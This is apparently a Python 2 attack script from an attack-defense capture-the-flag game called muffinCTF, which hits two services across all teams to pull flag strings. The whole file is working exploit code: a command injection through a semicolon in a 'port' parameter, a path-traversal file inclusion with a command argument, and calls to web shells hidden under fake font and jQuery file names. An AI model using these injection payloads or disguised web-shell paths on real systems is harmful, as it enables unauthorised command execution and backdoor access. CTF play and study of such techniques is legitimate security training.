#!/usr/bin/env python2

import requests
from tools import muffin_ctf

def get_flags(url):
    try:
        return requests.get(url).text
    except:
        return ''

def keep_exploit(attack_url):
    output = ''

    # grep -hra muffinCTF /home/keep/invitation
    output += get_flags(attack_url + 'inc/userinfo.php?a=grep+-hra+muffinCTF+/home/keep/invitation')
    output += get_flags(attack_url + 'inc/inc.php?page=../../../var/www/html/index.php&c=grep+-hra+muffinCTF+/home/keep/invitation')

    return output

def port_exploit(attack_url):
    output = ''

    # grep -hra muffinCTF /home/keep/invitation
    output += get_flags(attack_url + 'searchPortname.jsp?port=google.com%3Bgrep+-hra+muffinCTF+/home/keep/invitation')
    output += get_flags(attack_url + 'css/themes/default/assets/fonts/icons.svg.jsp?cmd=grep+-hra+muffinCTF+/home/keep/invitation')
    output += get_flags(attack_url + 'js/Framework/jquery.min/javascript/plugins/lib/jquery.min.js.jsp?cmd=grep+-hra+muffinCTF+/home/keep/invitation')

    return output

muffin_ctf.attack_all('keep', keep_exploit)
muffin_ctf.attack_all('port', port_exploit)
